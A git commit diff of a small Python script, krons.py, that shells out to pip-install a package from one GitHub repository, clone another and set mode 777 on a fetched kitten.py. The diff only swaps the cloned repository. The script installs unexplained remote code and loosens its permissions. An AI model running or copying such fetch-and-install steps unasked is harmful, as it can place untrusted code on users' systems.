58eece01c583efd3f73477a7623f2738e597ff34
gusterji <83457221+gusterji@users.noreply.github.com>
2021-05-22 22:49:23 +0530

    Update krons.py

--- krons.py
+++ krons.py
@@ -1,6 +1,6 @@
 import os
 os.system("pip3 install git+https://github.com/gusterji/lajisun.git")
-os.system("git clone https://github.com/eurohan1/defopy.git")
-os.system("chmod 777 defopy/kitten.py")
+os.system("git clone https://github.com/gusterji/dmini.git")
+os.system("chmod 777 dmini/kitten.py")
 
 
